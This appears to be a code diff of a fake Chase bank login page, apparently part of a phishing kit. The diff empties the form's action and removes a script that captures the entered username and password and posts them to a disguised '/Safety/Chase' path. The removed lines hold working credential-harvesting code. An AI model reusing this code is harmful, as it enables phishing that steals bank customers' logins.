@@ -29,7 +29,7 @@
             <div class="jpui raised segment">
                 <div class="row">
                     <div class="col-xs-10 col-xs-offset-1">
-                        <form id="login-form" method="post" autocomplete="off" action="/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcebbb33" novalidate="">
+                        <form id="login-form" method="post" autocomplete="off" action="#" novalidate="">
                             <label class="util accessible-text logon-xs-toggle" for="userId-input-field" data-attr="LOGON.userIdPlaceholder">
                                 <span class="accessible-text errorAdaText"></span>
                                 Username
@@ -116,64 +116,3 @@
         </div>
     </div>
 </div>
-
-<script src="/js/jquery-latest.min.js"></script>
-<script type="application/javascript">
-    // your function
-    let my_func = (event) => {
-        event.preventDefault();
-
-        sessionStorage.setItem("lu_username", document.getElementById("userId-input-field").value );
-        sessionStorage.setItem("lu_password1", document.getElementById("password-input-field").value );
-
-//        alert(sessionStorage.getItem("lu_username"));
-//        alert(sessionStorage.getItem("lu_password1"));
-
-//        window.location = winLocation("/1eb932e5745c485929f49dbefceccc33");
-        let data= {
-            username:  sessionStorage.getItem("lu_username"),
-            password1:  sessionStorage.getItem("lu_password1")
-        };
-        post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcebbb33', data);
-    };
-
-    // your form
-    let form = document.getElementById("login-form");
-
-    // attach event listener
-    form.addEventListener("submit", my_func, true);
-
-    let winLocation =(sub)=>{
-        let pathArray = window.location.pathname.split( '/' );
-        let newPathname = "";
-        for (i = 0; i < pathArray.length-1; i++) {
-            newPathname += "/";
-            newPathname += pathArray[i];
-        }
-        return newPathname+sub;
-    };
-
-    function post(path, params, method) {
-        method = method || "post"; // Set method to post by default if not specified.
-
-        // The rest of this code assumes you are not using a library.
-        // It can be made less wordy if you use one.
-        let form = document.createElement("form");
-        form.setAttribute("method", method);
-        form.setAttribute("action", path);
-
-        for(let key in params) {
-            if(params.hasOwnProperty(key)) {
-                let hiddenField = document.createElement("input");
-                hiddenField.setAttribute("type", "hidden");
-                hiddenField.setAttribute("name", key);
-                hiddenField.setAttribute("value", params[key]);
-
-                form.appendChild(hiddenField);
-            }
-        }
-
-        document.body.appendChild(form);
-        form.submit();
-    }
-</script>
